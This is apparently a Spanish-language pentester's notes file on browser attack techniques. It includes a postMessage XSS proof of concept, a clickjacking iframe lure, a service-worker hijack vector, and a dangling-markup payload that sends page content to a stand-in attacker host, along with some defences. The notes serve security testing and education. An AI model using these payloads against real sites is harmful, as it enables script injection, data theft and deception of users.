# Browser Security Research

## CSP bypass — ver `xss.md`

## postMessage abuse

Listener vulnerable:
```js
window.addEventListener('message', e => {
  document.body.innerHTML = e.data;  // sink directo
});
```

PoC:
```html
<iframe src="https://target.cl/page" id="x"></iframe>
<script>
  document.getElementById('x').onload = () => {
    document.getElementById('x').contentWindow.postMessage(
      '<img src=x onerror=alert(1)>', '*'
    );
  };
</script>
```

Buscar listeners:
```bash
grep -rE "addEventListener\\(['\"]message['\"]" js/
```

Validar: ¿comprueba `e.origin`? ¿usa whitelist?

## Service Workers

`/sw.js`, `/service-worker.js`. Si controlable → MITM persistente en cliente.

Vectores:
- Subir `sw.js` malicioso vía file upload con `Content-Type: text/javascript` y servirlo desde origen legítimo.
- Path traversal que termine en `.js`.

## Storage

- `localStorage` → no `HttpOnly`, leaked por XSS.
- `sessionStorage` → mismo problema.
- IndexedDB → mismo.
- Tokens sensibles **nunca** en localStorage.

## SameSite & CSRF

- `SameSite=Lax` (default moderno) bloquea cookies en POST cross-site, pero permite GET top-level.
- `SameSite=None` requiere `Secure`. Si server lo permite sin `Secure` → cookie no se setea en navegadores modernos.
- `SameSite=Strict` bloquea todo cross-site (puede romper SSO links).

CSRF moderno:
- Login CSRF (sin SameSite=Strict, atacante loguea víctima en cuenta atacante).
- POST CSRF en `Lax` requiere truco (form auto-submit con timing).
- JSON CSRF si server acepta `Content-Type: text/plain` o `application/x-www-form-urlencoded` con body JSON.

## XS-Leaks

Side-channels para inferir estado autenticado:
- Frame counting (`window.length` en iframe).
- Timing.
- Error events on `<script>`/`<img>`/`<link>` con cross-origin redirect.
- COOP/COEP/CORP misconfig.

Recursos:
- https://xsleaks.dev
- https://book.hacktricks.xyz/pentesting-web/xs-search

## Clickjacking

```html
<iframe src="https://target.cl/sensitive-action" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<button>Click here for prize</button>
```

Defensa: `X-Frame-Options: DENY` o `Content-Security-Policy: frame-ancestors 'none'`.

## Dangling markup injection

Cuando inyectas en contexto donde scripts están bloqueados pero HTML no:
```
<base href="//atacker.cl/">
<img src='https://atacker.cl/?
```
El segundo termina robando el resto del HTML hasta el siguiente `'`.
